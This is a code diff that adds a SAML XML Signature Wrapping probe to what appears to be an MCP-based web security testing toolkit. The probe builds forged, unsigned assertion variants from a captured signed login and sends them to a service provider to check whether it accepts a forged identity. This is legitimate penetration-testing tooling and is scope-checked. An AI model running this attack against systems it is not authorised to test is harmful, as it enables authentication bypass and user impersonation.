@@ -113,6 +113,7 @@ from .web import parserdiff as parserdiffmod
 from .web import pathnorm as pathnormmod
 from .web import probes as probesmod
 from .web import redirect as redirectmod
+from .web import saml as samlmod
 from .web import screenshot as screenshotmod
 from .web import secondorder as somod
 from .web import singlepacket as spmod
@@ -4991,6 +4992,118 @@ async def xxe_probe(target: str, body: str = "", content_type: str = "applicatio
     verdict = confirmmod.evaluate(oast_count=oast_count)
     result.update(verdict)
     return result
+
+
+@mcp.tool()
+@active_tool(intrusive=True)
+async def saml_xsw_probe(acs_url: str, saml_response: str, relay_state: str = "",
+                         forged_marker: str = samlmod.DEFAULT_FORGED_NAMEID) -> dict:
+    """**SAML XML Signature Wrapping (XSW)** probe. Give it a legitimately
+    signed `saml_response` (base64 — the HTTP-POST binding wire format — or raw
+    XML) already captured from a real login (via `http_history`/Burp/a
+    browser), and the SP's `acs_url` (Assertion Consumer Service endpoint).
+
+    First reports a **static structural read** (no network): assertion/signature
+    counts, and whether any `<ds:Signature>` `Reference URI` fails to match an
+    `Assertion` `ID` in the document — all classic XSW enablers.
+
+    Then resends the document three ways, each cloning the original signed
+    assertion, stripping the clone's signature, and overwriting its claimed
+    identity with `forged_marker`, spliced in per one of three representative
+    topologies (not the full XSW1-8 taxonomy — a small representative set, see
+    `moonmcp/web/saml.py`): `sibling_before` (tests "grabs the first
+    assertion"), `sibling_after` ("grabs the last"), `wrap_extension` ("only
+    looks at direct children of Response" — the original is relocated one
+    level deeper). The original assertion's signature is never touched.
+
+    Confirmation is layered: `reflected_forged_identity` — `forged_marker`
+    showing up in a variant's response but in NEITHER baseline's — is the
+    strongest, replay-noise-independent signal (the SP consumed the forged,
+    unsigned identity). `matches_accepted_baseline` is a weaker secondary
+    signal (status matches a verbatim resend of the original rather than a
+    signature-corrupted control) — noisier, since SAML anti-replay
+    (`OneTimeUse`/`InResponseTo`) can reject repeat sends independent of
+    signature binding. Never forges a valid signature — the wrapping trick IS
+    the attack. Intrusive; in scope only.
+    """
+
+    import base64
+    from urllib.parse import urlencode
+
+    ctx = get_context()
+    sc = _scope_check()
+
+    xml_text = samlmod.decode_response(saml_response)
+    structure = samlmod.parse_structure(xml_text)
+    if "error" in structure:
+        return {"acs_url": acs_url, "error": structure["error"], "detail": structure.get("detail")}
+    assessment = samlmod.assess_wrappable(structure)
+
+    async def _post(xml_doc: str) -> tuple[Any, str]:
+        b64 = base64.b64encode(xml_doc.encode()).decode()
+        body = urlencode({"SAMLResponse": b64, "RelayState": relay_state}).encode()
+        r = await ctx.http.fetch(acs_url, method="POST", body=body,
+                                 headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                 follow_redirects=False, scope_check=sc)
+        resp = samlmod.Resp(status=r.status, length=len(r.body), location=r.header("Location") or "")
+        return resp, r.text(50_000)
+
+    accepted_resp, accepted_body = await _post(xml_text)
+
+    corrupted_xml = samlmod.corrupt_signature(xml_text)
+    if corrupted_xml is not None:
+        corrupted_resp, corrupted_body = await _post(corrupted_xml)
+    else:
+        b64 = base64.b64encode(xml_text.encode()).decode()
+        truncated = b64[:-4] if len(b64) > 8 else b64 + "AAAA"
+        body = urlencode({"SAMLResponse": truncated, "RelayState": relay_state}).encode()
+        r = await ctx.http.fetch(acs_url, method="POST", body=body,
+                                 headers={"Content-Type": "application/x-www-form-urlencoded"},
+                                 follow_redirects=False, scope_check=sc)
+        corrupted_resp = samlmod.Resp(status=r.status, length=len(r.body), location=r.header("Location") or "")
+        corrupted_body = r.text(50_000)
+
+    variants: dict[str, dict] = {}
+    for v in samlmod.VARIANTS:
+        mutated = samlmod.build_variant(xml_text, v, forged_nameid=forged_marker)
+        if mutated is None:
+            variants[v] = {"error": "not_applicable",
+                          "detail": "document isn't a samlp:Response with an assertion"}
+            continue
+        vresp, vbody = await _post(mutated)
+        variants[v] = samlmod.assess_variant(
+            accepted=accepted_resp, corrupted=corrupted_resp, variant=vresp,
+            variant_body=vbody, accepted_body=accepted_body, corrupted_body=corrupted_body,
+            forged_marker=forged_marker)
+
+    scored = {v: a for v, a in variants.items() if "error" not in a}
+    # Only the strong, replay-noise-independent signal earns a spot in this
+    # top-level summary -- matches_accepted_baseline alone is too noisy to
+    # report as "vulnerable" (see the docstring); it's still visible per-variant.
+    hit_variants = [v for v, a in scored.items() if a["reflected_forged_identity"]]
+    strongest = next((v for v, a in scored.items() if a["reflected_forged_identity"]), None)
+    reflected_hits = [f"saml-xsw/{v}" for v, a in scored.items() if a["reflected_forged_identity"]]
+    verdict = confirmmod.evaluate(
+        reflected=bool(reflected_hits),
+        injection_hits=reflected_hits,
+        status_changed=any(a["matches_accepted_baseline"] for a in scored.values()),
+        length_delta=(scored[strongest]["length_delta_vs_corrupted"] if strongest else 0))
+
+    return {
+        "acs_url": acs_url,
+        "structure": structure,
+        "static_assessment": assessment,
+        **verdict,
+        "baseline_accepted": {"status": accepted_resp.status, "length": accepted_resp.length},
+        "baseline_corrupted": {"status": corrupted_resp.status, "length": corrupted_resp.length},
+        "variants": variants,
+        "vulnerable_variants": hit_variants,
+        "caveat": ("SAML anti-replay (OneTimeUse conditions, InResponseTo tracking) can make "
+                  "status/length baselines noisy across repeated sends of the same assertion "
+                  "ID -- reflected_forged_identity (the forged marker appearing in a variant's "
+                  "response but neither baseline's) is the strongest signal and is independent "
+                  "of that noise."),
+    }
 
 
 @mcp.tool()
